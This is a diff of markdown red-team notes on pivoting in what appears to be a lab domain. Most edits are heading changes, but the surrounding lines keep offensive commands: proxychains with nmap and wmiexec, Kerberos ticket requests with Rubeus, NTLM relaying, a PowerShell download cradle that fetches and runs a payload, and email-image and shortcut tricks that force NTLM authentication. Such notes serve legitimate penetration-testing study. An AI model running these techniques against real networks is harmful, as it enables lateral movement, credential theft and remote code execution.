@@ -1,6 +1,6 @@
 # Pivoting Notes
 
-**SOCKS**
+## SOCKS
 
 start a SOCKS4a proxy, second is SOCKS5
 ```
@@ -8,9 +8,9 @@ socks 1080
 socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
 ```
 
-**Linux Tools**
+## Linux Tools
 
-**proxychains**
+## proxychains
 
 ```
 sudo vim /etc/proxychains.conf
@@ -20,10 +20,10 @@ proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
 proxychains wmiexec.py DEV/jking@10.10.122.30
 ```
 
-**Windows Tools**
+## Windows Tools
 [Proxifier](https://www.proxifier.com/)
 
-**pivoting with kerberos**
+## pivoting with kerberos
 
 ```
 proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
@@ -56,11 +56,11 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]M
 C:\Tools\HeidiSQL\heidisql.exe
 ```
 
-**Browsers**
+## Browsers
 
 Using things like FoxyProxy
 
-**Reverse Port Forwards**
+## Reverse Port Forwards
 
 allows a machine to redirect inbound traffic on a specific port to another IP and port
 
@@ -78,7 +78,7 @@ can delete with
 powershell Remove-NetFirewallRule -DisplayName "8080-In"
 ```
 
-**NTLM Relaying**
+## NTLM Relaying
 
 being a mitm of the ntlm authentication and passing the request to the target 
 Tools:
@@ -118,15 +118,15 @@ Download cradle example before base64
 iex (new-object net.webclient).downloadstring("http://<IP>:<port>/<payload uri>")
 ```
 
-**Forcing NTLM Auth**
+# Forcing NTLM Auth
 
-### 1x1 Images in Emails
+## 1x1 Images in Emails
 having this in an email will trigger an NTLM auth attempt when opened in email clients like Outlook
 ```
 <img src="\\<relayer IP>\test.ico" height="1" width="1" />
 ```
 
-### Windows Shortcuts
+## Windows Shortcuts
 
 Putting a windows shortcut on something like a public share for others to click
 ```
@@ -139,7 +139,7 @@ $shortcut.Save()
 Additional Tools: [SpoolSample](https://github.com/leechristensen/SpoolSample), [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) [PetitPotam](https://github.com/topotam/PetitPotam) 
 
 
-**Relaying WebDAV**
+## Relaying WebDAV
 Tools: [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus)
 
 steps:
@@ -169,7 +169,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:PVWUMPY
 ```
 
 
-**Shadow credentials**
+## Shadow credentials
 
 This option will automatically dump a cert file for you
 1. relay with --shadow-credentials
